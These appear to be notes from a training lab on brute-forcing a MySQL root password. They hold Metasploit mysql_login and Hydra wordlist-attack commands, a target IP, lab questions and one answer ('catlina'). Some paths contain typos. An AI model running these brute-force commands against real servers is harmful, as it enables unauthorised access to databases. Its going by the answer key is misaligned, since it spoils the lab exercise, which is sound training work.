### Tools 
nmap

### Commands

```
msfconsole 
use auxiliary/scanner/msql/mysql_login
set rhosts target_ip
set pass_file /usr/share/metasploit-framework/data/worldlists/unix_passwords.txt
set verbose false
set stop_on_success true
set username root
exploit
```

Use Hydra to brute force MySQL Login 
```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip mysql
```


192.50.133.3
#### Questions
1.  Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```

```
   
2.  Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```

```

#### Answsers
1. catlina
2. 